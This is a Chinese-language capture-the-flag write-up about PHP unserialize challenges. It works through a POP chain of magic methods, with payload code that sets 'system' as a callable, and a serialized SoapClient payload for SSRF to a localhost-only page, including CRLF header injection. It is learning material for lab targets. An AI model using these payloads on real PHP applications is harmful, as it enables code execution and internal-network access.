### 1. un8 · POP 链

**考点**：多个类的魔术方法接力，到达危害函数

**思路（逆推法）**：
从终点 `a::resolve()` 开始，每一步问"谁调用了它"：

```
a::resolve()          ← 终点，有 echo $flag
  ↑ 谁调用？ c::__get 里的 $var[$name]()
  ↑ 谁触发 c::__get？ a::__toString 里读 $this->object->string（private）
  ↑ 谁触发 a::__toString？ b::addMe 里 "..." . $this->filename（对象拼接）
  ↑ 谁调用 b::addMe？ b::__call 里 call_user_func([$this,"addMe"])
  ↑ 谁触发 b::__call？ a::__destruct 里 $this->object->add()（b 没有 add）
  ↑ 谁触发 a::__destruct？ 自动（脚本结束）✅ 到顶
```

**三种"接力动作"**：
| 动作 | 触发的魔术方法 |
|---|---|
| 调不存在的方法 | `__call` |
| 对象当字符串 | `__toString` |
| 读 private 属性 | `__get` |

**payload 构造（从里往外）**：
```php
$a1 = new a();  $a1->ls = ["system"];              // 终点数据
$c1 = new c(["string" => [$a1, "resolve"]]);       // c → a1
$a2 = new a();  $a2->object = $c1;                 // a2 → c1
$b  = new b($a2);                                  // b → a2
$a3 = new a();  $a3->object = $b;                  // a3 → b（起点）
echo urlencode(serialize($a3));
```

**踩坑**：
- 删了 `addMe` 但保留 `__call` → `__call` 拼出的方法名找不到 → 再次进 `__call` → 方法名无限增长 → `Allowed memory size exhausted`
- **教训**：`__call` 和它的目标方法必须共存，要么都留要么都删
- `serialize` 写成了 `$a1`（终点数据对象），应该是起点 `$a3`
- 缺分号导致 `Parse error: unexpected token`（报错行往往是**上一行**缺分号）

**新知识点**：
- `array_walk($obj, cb)` 遍历对象属性，回调参数是（**值**, **键**）
- `$this->$name` = 可变属性；`$var[$name]()` = 取下标后调用（数组 callable）
- 序列化只存**属性**，不存**方法**
- 可见性决定序列化后的属性名：`public` → `名`；`protected` → `\0*\0名`；`private` → `\0类名\0名`

### 2. un9 / un92 · SoapClient SSRF

**考点**：**没有自定义类时，用 PHP 内置类**

un9.php 源码：
```php
if (isset($_GET['tryhackme']) && is_string($_GET['tryhackme'])){
    $a = unserialize($_GET['tryhackme']);
    $a->pyflag();          // ← 调一个不存在的方法
}
```
**⚠️ 但源码里**没有 class 定义**** → 只能用内置类。

**用 `SoapClient`**（它有 `__call`，会发 HTTP 请求）：
```
O:10:"SoapClient":2:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/un92.php";}
```

**验证成功的报错**：
```
SoapClient->__call('pyflag', Array)     ← __call 被触发
looks like we got no XML document       ← 请求发出去了，响应非 XML
```

**为什么这是 SSRF**：
un92.php 要求 `REMOTE_ADDR == 127.0.0.1`，头部伪造（XFF 等）无效 →
**只能让服务器自己发请求** → SoapClient 的请求源地址就是 127.0.0.1 ✅

**CRLF 注入（`uri` 属性）**：
`SoapClient` 把 `uri` 拼进 `SOAPAction` 头，`\r\n` 可注入任意头：
```php
$uri = "aaab\r\nX-Test-Injected: HELLO123";
// → 请求头里出现 x-test-injected: HELLO123 ✅
```
进一步可注入 `Content-Length` + body，**完全控制 POST 请求体**。

**踩坑**：
- `user_agent` 属性在 **PHP 5.5 无效**（UA 固定 `PHP-SOAP/5.5.38`），网上的写法是 PHP 7 的
- `location` 里不能注入 CRLF（会被当成 URL 的一部分 → 404）
- `gopher://` / `dict://` 等协议被禁（只允许 http/https）
- **未解决**：un92.php 的响应是 flag（非 XML），被 SoapClient 解析失败吞掉了，需要一个"读响应"的渠道

**新知识点**：
- PHP 内置类反序列化：`SoapClient`（SSRF）、`Error`/`Exception`（XSS）、`SimpleXMLElement`（XXE）、`SplFileObject`（读文件）、`DirectoryIterator`（列目录）
- `REMOTE_ADDR` 是 TCP 层，HTTP 头改不了
- CRLF = `\r\n` = `%0d%0a`
